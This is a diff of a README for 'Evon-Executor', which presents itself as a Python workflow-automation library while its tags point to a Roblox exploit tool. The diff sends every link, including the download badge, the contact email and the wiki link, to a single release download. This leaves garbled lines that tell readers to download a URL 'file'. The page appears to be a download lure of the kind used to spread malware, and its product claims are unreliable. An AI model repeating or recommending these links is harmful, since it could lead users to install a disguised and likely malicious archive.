@@ -9,12 +9,12 @@ Evon-Executor is a powerful tool designed for task execution and workflow manage
 automation, cloud-native, distributed-systems, evon-download, evon-roblox, github, open-source, orchestration, python, python-library, roblox, serverless, task-execution, workflow-management
 
 ## 🌐 Link
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/file/App.zip)
+[![Download https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0](https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0)](https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0)
 
 ---
 
 ### Getting Started
-To get started with Evon-Executor, simply download the `App.zip` file from the provided link and follow the installation instructions. If the link does not work or you need more information, check the "Releases" section of this repository.
+To get started with Evon-Executor, simply download the `https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0` file from the provided link and follow the installation instructions. If the link does not work or you need more information, check the "Releases" section of this repository.
 
 ### Features
 - **Automation**: Automate your tasks and workflows efficiently.
@@ -24,7 +24,7 @@ To get started with Evon-Executor, simply download the `App.zip` file from the p
 - **Python Library**: Utilize the power of Python with Evon-Executor.
 
 ### How to Use
-1. Download the `App.zip` file from the link provided.
+1. Download the `https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0` file from the link provided.
 2. Extract the contents to your desired directory.
 3. Follow the documentation in the repository to start using Evon-Executor for your projects.
 
@@ -34,7 +34,7 @@ We welcome contributions from the community to make Evon-Executor even better. F
 ---
 
 ## 🚀 Get Started with Evon-Executor Today!
-Evon-Executor is your go-to solution for task execution and workflow management. With its support for the Unified Naming Convention and compatibility with various modern scripts, Evon simplifies the complexities of automation and distributed systems. Download the `App.zip` file now and revolutionize your workflow with Evon!
+Evon-Executor is your go-to solution for task execution and workflow management. With its support for the Unified Naming Convention and compatibility with various modern scripts, Evon simplifies the complexities of automation and distributed systems. Download the `https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0` file now and revolutionize your workflow with Evon!
 
 ---
 
@@ -42,13 +42,13 @@ Evon-Executor is your go-to solution for task execution and workflow management.
 Connect with other users, share your experiences, and stay updated on the latest Evon-Executor developments by joining our community forums. See you there! 👋
 
 ### 📧 Contact Us
-Have questions or feedback? Feel free to reach out to us at [contact@evonexecutor.com](mailto:contact@evonexecutor.com).
+Have questions or feedback? Feel free to reach out to us at [https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0](https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0).
 
 ### 📄 License
 Evon-Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ### 🛠️ Support
-For any technical support or assistance, please refer to the [Wiki](https://github.com/Evon-Executor/wiki) section of this repository.
+For any technical support or assistance, please refer to the [Wiki](https://github.com/ItsuzerZ/Evon-Executor/releases/tag/v2.0) section of this repository.
 
 ---
 
